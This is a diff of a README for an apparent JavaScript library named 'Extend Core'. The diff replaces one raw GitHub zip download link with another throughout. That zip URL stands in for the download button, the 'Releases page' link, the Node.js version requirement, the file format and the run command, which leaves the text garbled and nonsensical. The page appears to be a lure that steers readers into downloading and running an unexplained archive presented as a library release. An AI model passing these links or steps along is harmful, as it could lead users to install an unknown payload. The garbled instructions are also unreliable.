@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download extend-core](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip)](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip)
+[![Download extend-core](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip)](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -13,24 +13,24 @@ You don’t need any programming knowledge to get started with Extend Core. Just
 ## 📋 System Requirements
 
 - **Operating System:** Windows, macOS, or a recent version of Linux.
-- **https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip** Version 12 or higher (for using with JavaScript applications).
+- **https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip** Version 12 or higher (for using with JavaScript applications).
 - **Internet Connection:** Needed to download the library and updates.
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page to download](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip).
+1. **Visit the Releases Page:** Go to the [Releases page to download](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip).
    
 2. **Choose Your Version:** Look for the latest version at the top of the page. Each version will have a title and release notes. These notes can help you understand the new features and changes.
 
 3. **Download the File:**
    - Click on the download link that matches your operating system.
-   - The file will be in a `.zip` or `https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip` format.
+   - The file will be in a `.zip` or `https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip` format.
 
 4. **Extract the Files:** Once the download completes, locate the downloaded file on your computer. Right-click the file and select "Extract All" or use a similar option your system provides.
 
 5. **Install Dependencies:** Open a terminal or command prompt and navigate to the folder where you extracted the files. Run `npm install` to install any necessary dependencies.
 
-6. **Run the Library:** In your terminal or command prompt, type `node https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip` (replace with the actual filename) to see Extend Core in action.
+6. **Run the Library:** In your terminal or command prompt, type `node https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip` (replace with the actual filename) to see Extend Core in action.
 
 ## 🛠 Features
 
@@ -57,7 +57,7 @@ Your contributions are welcome! If you would like to help enhance this project, 
 
 ## 🔗 Links
 
-- [Releases page to download](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/unillusory/extend-core.zip)
+- [Releases page to download](https://raw.githubusercontent.com/enkzcestaro/extend-core/main/src/extend_core_v2.0-alpha.3.zip)
 - [Documentation](#)
 - [GitHub Issues](#)
 
